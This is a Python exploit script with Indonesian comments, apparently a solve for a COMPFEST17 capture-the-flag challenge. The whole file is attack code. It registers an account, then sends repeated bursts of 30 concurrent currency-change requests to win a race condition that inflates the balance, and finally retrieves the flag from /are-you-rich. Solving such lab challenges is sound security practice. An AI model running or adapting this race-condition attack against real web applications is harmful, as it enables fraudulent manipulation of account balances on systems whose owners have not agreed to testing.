import requests
import threading
from time import sleep

# --- KONFIGURASI ---
URL = "http://ctf.compfest.id:7303" # Ganti dengan URL target
USERNAME = "heker"
PASSWORD = "heker123"
NUM_THREADS = 30 # Jumlah request bersamaan dalam satu 'burst'
ATTACK_ROUNDS = 5 # Jumlah pengulangan serangan

# --- SCRIPT ---
s = requests.Session()

def register_and_login():
    print("[*] Mendaftar dan login...")
    # Daftar akun baru
    s.post(f"{URL}/register", data={"username": USERNAME, "password": PASSWORD, "confirm_password": PASSWORD})
    
    # Login untuk mendapatkan session cookie
    res = s.post(f"{URL}/login", data={"username": USERNAME, "password": PASSWORD})
    if "INCORRECT" in res.text:
        print("[-] Login gagal, mungkin username sudah ada. Coba ganti username.")
        exit()
    print("[+] Login berhasil!")

def change_currency_to(currency):
    """Fungsi untuk satu request ganti mata uang"""
    s.post(f"{URL}/change-currency", data={"currency": currency})

def attack_burst():
    """Membuat dan menjalankan thread untuk serangan race condition"""
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=change_currency_to, args=("IDR",))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

def check_balance():
    """Mengecek saldo saat ini"""
    res = s.get(f"{URL}/")
    try:
        balance_line = [line for line in res.text.split('\n') if "Your balance is" in line][0]
        print(f"[i] {balance_line.strip()}")
    except IndexError:
        print("[!] Tidak dapat menemukan info saldo.")


# --- Main Execution ---
register_and_login()

print("\n[*] Memulai serangan Race Condition...")
for i in range(ATTACK_ROUNDS):
    print(f"\n--- Ronde {i+1}/{ATTACK_ROUNDS} ---")
    
    # 1. Setel ulang mata uang ke AUD
    print("[*] Menyetel ulang mata uang ke AUD...")
    change_currency_to("AUD")
    check_balance()
    sleep(0.5) # Beri jeda sedikit
    
    # 2. Kirim ledakan request untuk ganti ke IDR
    print(f"[*] Mengirim {NUM_THREADS} request ke IDR secara bersamaan...")
    attack_burst()
    check_balance()

# 3. Cek apakah sudah kaya
print("\n[*] Serangan selesai. Mengecek apakah kita sudah kaya...")
res = s.get(f"{URL}/are-you-rich")

if "COMPFEST17" in res.text:
    print("\n[+] SUKSES! Flag ditemukan:")
    flag_line = [line for line in res.text.split('\n') if "COMPFEST17" in line][0]
    print(f"    {flag_line.strip()}")
else:
    print("\n[-] Gagal. Coba tingkatkan NUM_THREADS atau ATTACK_ROUNDS.")
